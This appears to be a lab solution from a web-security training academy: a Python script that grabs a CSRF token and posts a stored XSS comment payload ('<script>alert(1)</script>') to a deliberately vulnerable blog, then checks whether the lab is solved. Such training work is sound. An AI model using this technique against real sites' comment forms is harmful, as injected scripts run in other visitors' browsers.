# Stored XSS into HTML context with nothing encoded
> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

```python
"""
LAB: Stored XSS into HTML context with nothing encoded
TYPE: Stored XSS
DESCRIPTION: 
    1. Fetches a valid CSRF token from a blog post page.
    2. Submits a malicious comment containing the XSS payload.
    3. Verifies if the lab is solved.
"""

import requests
from bs4 import BeautifulSoup

# --- Configuration ---
BASE_URL = "https://0abf005b04c9c9f280c444b5007a002a.web-security-academy.net/"
POST_ID = "2" # Arbitrary post to host our exploit

def exploit():
    # Construct endpoints
    csrf_url = f"{BASE_URL}/post?postId={POST_ID}"
    comment_url = f"{BASE_URL}/post/comment"
    
    # Use a session to maintain cookies (trackingId, session)
    session = requests.Session()

    # 1. Get the CSRF token
    print(f"[*] Fetching CSRF token from Post {POST_ID}...")
    response = session.get(csrf_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']

    # 2. Submit the Stored XSS Payload
    payload = {
        "csrf": csrf_token,
        "postId": POST_ID,
        "comment": "<script>alert(1)</script>",
        "name": "Attacker",
        "email": "attacker@evil.com",
        "website": ""
    }

    print(f"[*] Submitting Stored XSS Payload...")
    response = session.post(comment_url, data=payload)

    # 3. Verification
    # For Stored XSS, we often need to revisit the page to trigger the 'Congratuations' check
    # But usually, the POST response in these labs includes the status update.
    if "Congratulations" in response.text:
        print("[+] SUCCESS: Lab Solved.")
    else:
        # Sometimes we need to refresh the page to see the banner
        check_response = session.get(csrf_url)
        if "Congratulations" in check_response.text:
            print("[+] SUCCESS: Lab Solved (Verified on refresh).")
        else:
            print("[-] FAILED: Payload submitted but lab not solved.")

if __name__ == "__main__":
    exploit()
```